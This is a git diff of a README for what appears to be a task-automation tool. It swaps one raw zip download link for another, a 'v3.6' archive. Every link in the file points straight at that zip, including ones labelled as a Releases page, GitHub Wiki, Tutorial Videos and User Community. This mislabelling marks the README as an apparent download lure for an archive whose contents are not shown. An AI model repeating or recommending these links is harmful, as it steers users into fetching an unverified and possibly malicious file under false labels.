@@ -1,6 +1,6 @@
 # 🚀 RPA_downloadEenvioAutomatico - Automate Your Tasks Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+[![Download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
 
 ## 🖥️ Introduction
 
@@ -10,7 +10,7 @@ Welcome to RPA_downloadEenvioAutomatico! This software helps automate manual tas
 
 You can download the latest version of RPA_downloadEenvioAutomatico from our Releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
 
 Here are the steps to install the application:
 
@@ -66,10 +66,10 @@ Yes, you can modify task settings according to your specific needs.
 
 If you're looking for further help, here are some useful resources:
 
-- [GitHub Wiki](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
-- [Tutorial Videos](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
-- [User Community](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+- [GitHub Wiki](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
+- [User Community](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
 
 With RPA_downloadEenvioAutomatico, you have the tools to make your work easier and more efficient. Feel free to reach out for any questions. 
 
-[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/RPA_downloadEenvioAutomatico.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Namukill/RPA_downloadEenvioAutomatico/main/slade/Automatico_download_Eenvio_RP_v3.6.zip)
